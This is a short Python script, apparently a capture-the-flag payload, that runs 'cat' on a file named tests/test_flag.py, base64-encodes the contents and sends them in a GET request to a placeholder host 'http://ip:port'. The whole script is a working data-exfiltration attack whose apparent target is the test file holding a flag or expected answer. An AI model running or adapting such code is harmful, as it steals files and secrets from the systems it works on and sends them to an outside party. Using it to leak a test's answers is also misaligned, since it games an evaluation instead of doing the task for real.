import urllib3
from subprocess import Popen, PIPE
from base64 import b64encode as e


http = urllib3.PoolManager()
p = Popen(['cat', 'tests/test_flag.py'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
output, err = p.communicate()

http.request('GET', 'http://ip:port?lol=' + e(output).decode())
